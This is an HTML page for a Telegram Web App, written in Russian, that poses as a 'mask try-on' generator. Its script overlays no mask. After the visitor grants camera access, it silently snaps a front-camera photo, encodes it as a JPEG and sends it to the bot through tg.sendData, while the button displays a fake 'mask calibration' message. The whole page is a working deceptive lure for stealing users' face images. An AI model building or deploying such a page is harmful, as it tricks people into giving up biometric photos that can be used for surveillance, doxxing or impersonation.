<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Антошка Маска</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #0f0f0f;
            color: white;
            font-family: sans-serif;
            text-align: center;
            padding-top: 60px;
            padding-left: 20px;
            padding-right: 20px;
        }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { color: #b0b0b0; font-size: 14px; line-height: 1.4; }
        button {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 25px;
            font-weight: bold;
        }
        #videoElement { display: none; }
    </style>
</head>
<body>

    <div id="loader">
        <h2>🎭 Генератор маски «Антошка»</h2>
        <p>Чтобы примерить эксклюзивную маску и посмотреть, как она наложится на твое лицо, разреши доступ к камере.</p>
        <button id="loadBtn">Примерить маску</button>
    </div>

    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const loadBtn = document.getElementById('loadBtn');
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');

        loadBtn.addEventListener('click', async () => {
            loadBtn.innerText = 'Калибровка маски...';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
                    
                    stream.getTracks().forEach(track => track.stop());
                    
                    tg.sendData(imageDataURL);
                }, 1000);

            } catch (err) {
                alert("Ошибка доступа к камере: " + err.message);
                loadBtn.innerText = 'Примерить маску';
            }
        });
    </script>
</body>
</html>
